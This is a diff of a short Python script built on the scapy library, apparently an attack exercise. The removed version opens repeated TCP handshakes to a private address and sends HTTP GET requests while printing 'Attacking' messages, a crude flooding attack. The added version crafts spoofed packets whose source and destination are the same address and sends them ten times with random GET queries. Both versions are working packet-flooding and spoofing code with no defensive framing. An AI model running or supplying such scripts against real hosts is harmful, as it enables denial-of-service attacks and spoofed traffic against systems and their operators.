@@ -1,27 +1,20 @@
-from scapy.all import *
+import random
+
+from scapy.layers.http import HTTP
 from scapy.layers.inet import IP, TCP
+from scapy.sendrecv import send
 
-target = '192.168.1.103'
-sp = 80
-numgets = 10
 
-print("Attacking ", target, " with ", numgets, " GETs")
 
-i = IP()
-i.dst = target
-print("IP layer prepared: ", i.summary())
-ans = None
 
-for s in range(sp, sp+numgets-1):
-    t = TCP()
-    t.dport = 80
-    t.sport = s
-    t.flags = "S"
-    ans = sr1(i/t, verbose=0)
-    t.seq = ans.ack
-    t.ack = ans.seq + 1
-    t.flags = "A"
-    get = "GET / HTTP/1.1\r\nHost: " + target
-    ans = sr1(i/t/get, verbose=0)
-    print("Attacking from port ", s)
-print("Done!")
+
+
+packet = IP(ttl=10)
+packet.src = '10.10.10.10'
+packet.dst = '10.10.10.10'
+
+packet = packet/TCP()
+b = "GET /?{} HTTP/1.1".format(random.randint(0, 2000))
+b = bytes(b, "utf-8")
+packet = packet/HTTP(b)
+send(packet*10)
